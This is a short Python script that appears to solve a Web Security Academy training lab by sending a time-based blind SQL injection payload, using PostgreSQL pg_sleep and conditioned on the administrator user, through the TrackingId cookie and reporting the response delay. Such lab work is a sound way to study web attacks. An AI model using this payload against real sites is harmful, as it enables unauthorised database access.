import requests
from colorama import Fore,Style

url = "https://0a1a002903e7686080fb530e00c600f4.web-security-academy.net/"

def checking(value):
    cookies = {'TrackingId':f"jGqrDvA21tCY1EdO{value}"}
    response = requests.get(url,cookies=cookies)
    return response.text, response.headers, response.elapsed


payload = f"'AND+(Select+Case+WHEN+(username='administrator')Then+(Select+(select 'a' from users)+from+pg_sleep(20))ELSE+'a'+END+from+users)='a'--"
body,headers,conn = checking(payload)

if ("Gateway Timeout" in body):
    print(f"{Fore.RED} [-] LAB Expired {Style.RESET_ALL}")

else:
    print(f"{Fore.GREEN} [+] Response took this amount of time: {conn} and {body} {Style.RESET_ALL}" )
